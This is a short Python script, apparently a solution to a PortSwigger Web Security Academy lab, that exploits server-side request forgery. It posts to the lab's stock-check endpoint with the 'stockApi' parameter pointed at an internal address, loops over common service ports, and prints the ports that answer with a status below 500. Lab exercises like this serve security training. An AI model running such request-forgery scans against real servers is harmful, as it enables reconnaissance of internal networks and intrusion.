
import requests


url = "https://ac391fd71e168317c0fd3b7600ba005f.web-security-academy.net/product/stock"

ports = [21,22,23,25,80,53,139,445,8080,8000,8081]

for i in ports:

	data = {
		
		"stockApi":"http://192.168.0.230:{}".format(i)
	}

	r =requests.post(url,data=data)

	if r.status_code<500:
		print("port number is {}".format(i))
		print("status code is {}".format(r.status_code))
